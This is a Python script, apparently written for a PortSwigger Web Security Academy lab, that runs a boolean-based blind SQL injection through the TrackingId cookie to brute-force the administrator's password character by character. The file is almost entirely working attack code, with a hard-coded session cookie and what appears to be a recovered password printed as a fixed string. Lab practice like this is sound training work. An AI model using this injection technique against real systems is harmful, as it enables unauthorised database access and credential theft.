#!/usr/bin/python3
from pwn import *
import requests
import signal
import time
import sys
import string


def def_handler(sig, frame):
	print("\n\n[!] Saliendo ... \n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0aea0076032a60aec0667641005e00a8.web-security-academy.net"
characters = string.ascii_letters + string.digits


def makeRequest():
    
    password = ""
    
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Password")
    
    for position in range(1, 21):
        for character in characters:
                cookies = {
                        'TrackingId': "NQLIhBYeW4w1MyVo' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
                        'session': 'xvlWiv1y8k5JPO01r2TF1wB0SmlWFzZ6'
                }
                p1.status(cookies['TrackingId'])
                r = requests.get(main_url, cookies=cookies)
                if "Welcome back!" in r.text:
                    password += character
                    p2.status(password)
                    break

print("My password was: koa1z59sfl237dt7vmmm")
if __name__ == '__main__':

	makeRequest()
